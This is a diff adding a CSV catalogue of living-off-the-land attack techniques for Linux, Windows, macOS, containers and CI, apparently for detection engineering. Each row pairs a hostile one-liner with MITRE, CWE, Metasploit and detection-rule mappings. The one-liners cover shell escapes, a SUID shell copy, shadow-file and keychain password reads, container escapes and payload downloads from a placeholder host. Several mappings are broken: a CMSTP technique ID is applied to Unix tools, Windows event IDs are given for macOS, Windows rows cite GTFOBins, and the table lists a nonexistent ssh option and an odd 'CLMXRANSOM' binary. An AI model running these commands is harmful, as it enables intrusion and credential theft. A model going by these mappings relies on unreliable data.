@@ -1,0 +1,45 @@
+evasion_id,platform,binary,technique_id,primitive,cwe_id,triage_cost,mitre,runbook,module,host_rule,network_rule,sigma,provenance
+EV-LNX-0001,linux,find,T1218.003,find -exec /bin/sh -p,CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,exploit/multi/handler,86690,,ssa_linux_find_exec.yml,GTFOBINS@master@2026-01-12
+EV-LNX-0002,linux,vim,T1218.003,vim -c '!sh',CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,exploit/multi/handler,86691,,ssa_linux_editor_shell.yml,GTFOBINS@master@2026-01-12
+EV-LNX-0003,linux,nano,T1218.003,nano /etc/shadow then read shadow,CWE-732,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86692,,,GTFOBINS@master@2026-01-12
+EV-LNX-0004,linux,awk,T1218.003,awk 'BEGIN {system("/bin/sh")}',CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86693,,,GTFOBINS@master@2026-01-12
+EV-LNX-0005,linux,perl,T1059.006,perl -e 'exec /bin/sh',CWE-78,low,T1059.006,01-intel/playbooks/linux/privilege-escalation.md,,86694,,ssa_interpreter_shell.yml,GTFOBINS@master@2026-01-12
+EV-LNX-0006,linux,python,T1059.006,python -c 'import os;os.system("/bin/sh")',CWE-78,low,T1059.006,01-intel/playbooks/linux/privilege-escalation.md,,86694,,ssa_interpreter_shell.yml,GTFOBINS@master@2026-01-12
+EV-LNX-0007,linux,sudo,T1548.003,sudo -l find NOPASSWD allow-list,CWE-250,low,T1548.003,01-intel/playbooks/linux/privilege-escalation.md,exploit/linux/sudo/local,86695,,,GTFOBINS@master@2026-01-12
+EV-LNX-0008,linux,cp,T1548.003,cp /bin/sh /tmp; chmod u+s /tmp/sh,CWE-732,medium,T1548.003,01-intel/playbooks/linux/privilege-escalation.md,,86696,,,GTFOBINS@master@2026-01-12
+EV-LNX-0009,linux,env,T1218.003,env /bin/sh,CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86690,,ssa_linux_find_exec.yml,GTFOBINS@master@2026-01-12
+EV-LNX-0010,linux,gdb,T1218.003,gdb -p <pid> -ex 'shell /bin/sh',CWE-78,medium,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86697,,,GTFOBINS@master@2026-01-12
+EV-LNX-0011,linux,apt/dpkg,T1218.003,dpkg -x malicious.deb /tmp,CWE-78,medium,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86698,,,GTFOBINS@master@2026-01-12
+EV-LNX-0012,linux,less/man/more,T1218.003,!sh escape from pager,CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86691,,ssa_linux_editor_shell.yml,GTFOBINS@master@2026-01-12
+EV-LNX-0013,linux,git,T1059.004,git -c core.pager='sh -c sh',CWE-78,low,T1059.004,01-intel/playbooks/linux/privilege-escalation.md,,86699,,,GTFOBINS@master@2026-01-12
+EV-LNX-0014,linux,tar/rsync/zip,T1218.003,--checkpoint-action=exec shell,CWE-78,medium,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86700,,,GTFOBINS@master@2026-01-12
+EV-LNX-0015,linux,ssh,T1218.003,ProxyCommand / ReverseShellCommand,CWE-78,medium,T1218.003,01-intel/playbooks/network/pivoting.md,auxiliary/scanner/ssh,86701,,,GTFOBINS@master@2026-01-12
+EV-LNX-0016,linux,at/crontab,T1053.003,at now / crontab -e persistence,CWE-732,low,T1053.003,01-intel/playbooks/os/linux/persistence.md,,86702,3001201,ssa_linux_cron_persistence.yml,GTFOBINS@master@2026-01-12
+EV-LNX-0017,linux,nsenter,T1610,nsenter -t <pid> -m -u -i -n -p /bin/bash,CWE-269,medium,T1610,01-intel/playbooks/os/linux/container-escape.md,exploit/linux/local/docker,86703,,,GTFOBINS@master@2026-01-12
+EV-WIN-0001,windows,psexec,T1021.002,psexec.exe -s \\HOST cmd.exe,CWE-78,low,T1021.002,01-intel/playbooks/active-directory/lateral-movement.md,exploit/windows/smb/psexec,4672,3001301,ssa_windows_psexec.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0002,windows,mmc,T1218.003,mmc .msc -> malicious snap-in DLL,CWE-78,low,T1218.003,01-intel/playbooks/active-directory/lateral-movement.md,,4698,,ssa_windows_mmc_dll.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0003,windows,schtasks,T1053.005,schtasks /create /sc minute /tn x /tr x,CWE-732,low,T1053.005,01-intel/playbooks/os/windows/persistence.md,exploit/windows/smb/smb_exec,4698,3001302,ssa_windows_schtasks.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0004,windows,bitsadmin,T1197,BITS transfer of a remote payload,CWE-494,low,T1197,01-intel/playbooks/os/windows/execution.md,,4698,3001303,ssa_windows_bitsadmin.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0005,windows,certutil,T1105,certutil -urlcache -split -f payload.exe,CWE-494,low,T1105,01-intel/playbooks/os/windows/execution.md,auxiliary/downloader/HttpClient,4698,3001304,ssa_windows_certutil.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0006,windows,regsvr32,T1218.010,regsvr32 /i:payload.dll scrobj.dll,CWE-78,low,T1218.010,01-intel/playbooks/os/windows/execution.md,exploit/windows/smb/smb_delivery,4698,3001305,ssa_windows_regsvr32.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0007,windows,mshta,T1218.005,mshta.exe https://host/payload.hta,CWE-78,low,T1218.005,01-intel/playbooks/os/windows/execution.md,exploit/windows/smb/smb_delivery,4698,3001306,ssa_windows_mshta.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0008,windows,installutil,T1218.003,InstallUtil /U /C payload.dll,CWE-78,low,T1218.003,01-intel/playbooks/os/windows/execution.md,exploit/windows/smb/smb_delivery,4698,3001307,ssa_windows_installutil.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0009,windows,msbuild,T1059.001,MSBuild inline task inline task,CWE-78,low,T1059.001,01-intel/playbooks/os/windows/execution.md,,4698,3001308,ssa_windows_msbuild_inline.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0010,windows,CLMXRANSOM,T1218.003,CLMXRANSOM.exe -inmemory -i http://host/payload,CWE-78,medium,T1218.003,01-intel/playbooks/os/windows/execution.md,exploit/windows/local_executor,4698,,ssa_windows_clmxransom.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0011,windows,runas,T1218.003,runas /trustlevel:0x20000 cmd,CWE-78,low,T1218.003,01-intel/playbooks/os/windows/execution.md,,4672,,,GTFOBINS@master@2026-01-12
+EV-WIN-0012,windows,cmstp,T1218.003,cmstp.exe /s http://host/p.inf,CWE-78,low,T1218.003,01-intel/playbooks/os/windows/execution.md,,4698,3001309,ssa_windows_cmstp.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0013,windows,wmic,T1047,WMIC /node:HOST process call create,CWE-78,low,T1047,01-intel/playbooks/active-directory/lateral-movement.md,exploit/windows/smb/wmi_exec,4672,,ssa_windows_wmi_exec.yml,GTFOBINS@master@2026-01-12
+EV-WIN-0014,windows,msiexec,T1218.005,msiexec /i http://host/p.msi,CWE-78,low,T1218.005,01-intel/playbooks/os/windows/persistence.md,exploit/windows/smb/smb_delivery,4698,3001310,ssa_windows_msiexec.yml,GTFOBINS@master@2026-01-12
+EV-MAC-0001,macos,osascript,T1059.002,osascript -e 'do shell script "sh"',CWE-78,low,T1059.002,01-intel/playbooks/os/macos/privilege-escalation.md,,4624,,,GTFOBINS@master@2026-01-12
+EV-MAC-0002,macos,security,T1552.001,security find-generic-password -w -s login,CWE-522,low,T1552.001,01-intel/playbooks/os/macos/credentials.md,,4624,,,GTFOBINS@master@2026-01-12
+EV-MAC-0003,macos,launchctl,T1543.004,launchctl load malicious.plist,CWE-732,low,T1543.004,01-intel/playbooks/os/macos/persistence.md,,4698,,,GTFOBINS@master@2026-01-12
+EV-MAC-0004,macos,defaults,T1548.003,defaults write com.apple.Safari AllowRemoteAutomation 1,CWE-269,low,T1548.003,01-intel/playbooks/os/macos/privilege-escalation.md,,4624,,,GTFOBINS@master@2026-01-12
+EV-MAC-0005,macos,sudo,T1548.003,sudo -l NOPASSWD allow-list abuse,CWE-250,low,T1548.003,01-intel/playbooks/os/macos/privilege-escalation.md,exploit/multi/handler,4624,,,GTFOBINS@master@2026-01-12
+EV-CTR-0001,containers,docker,T1610,docker run -v /:/host -it --privileged --net=host,CWE-269,low,T1610,01-intel/playbooks/os/linux/container-escape.md,exploit/linux/local/docker,86703,,ssa_docker_privileged_run.yml,GTFOBINS@master@2026-01-12
+EV-CTR-0002,containers,kubectl,T1609,kubectl exec -it pod -c pod -- sh,CWE-269,low,T1609,01-intel/playbooks/os/linux/container-escape.md,,4672,,,GTFOBINS@master@2026-01-12
+EV-CTR-0003,containers,crictl,T1609,crictl exec -it <id> sh,CWE-269,low,T1609,01-intel/playbooks/os/linux/container-escape.md,,4672,,,GTFOBINS@master@2026-01-12
+EV-CTR-0004,containers,containerd,T1610,ctr -n k8s.io task exec,CWE-269,low,T1610,01-intel/playbooks/os/linux/container-escape.md,,4672,,,GTFOBINS@master@2026-01-12
+EV-CTR-0005,containers,nsenter,T1610,nsenter -t 1 -m -u -i -n -p bash,CWE-269,low,T1610,01-intel/playbooks/os/linux/container-escape.md,exploit/linux/local/docker,86703,,,GTFOBINS@master@2026-01-12
+EV-CI-0001,ci,jenkins,T1195.002,Jenkins Script Console arbitrary Groovy,CWE-94,low,T1195.002,01-intel/playbooks/cloud/ci-cd-abuse.md,,4672,3001401,ssa_jenkins_groovy_console.yml,GTFOBINS@master@2026-01-12
+EV-CI-0002,ci,gitlab-runner,T1195.002,Shell executor with arbitrary script,CWE-94,low,T1195.002,01-intel/playbooks/cloud/ci-cd-abuse.md,,4672,3001402,ssa_gitlab_runner_shell.yml,GTFOBINS@master@2026-01-12
+EV-CI-0003,ci,github-actions,T1195.002,pull_request_target with checkout of fork,CWE-94,low,T1195.002,01-intel/playbooks/cloud/ci-cd-abuse.md,,4672,3001403,ssa_github_actions_checkout.yml,GTFOBINS@master@2026-01-12
